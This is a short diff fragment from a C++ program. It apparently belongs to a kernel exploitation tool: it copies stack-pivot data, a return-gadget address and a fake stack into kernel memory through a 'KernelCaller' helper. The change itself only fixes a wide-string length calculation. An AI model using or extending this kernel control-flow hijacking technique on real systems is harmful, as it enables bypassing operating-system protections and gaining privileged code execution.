@@ -131,7 +131,7 @@ int main()
     BootstrapPivotData.JumpAddress = RetGadgetAddress;
 
     KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", PivotDataAllocation, &BootstrapPivotData, sizeof(PivotData));
-    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 2);
+    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", SourceStringArg, (void*)EventNameString, (lstrlenW(EventNameString) + 1) * sizeof(WCHAR));
     KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
     KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
     KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", (void*)((std::uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
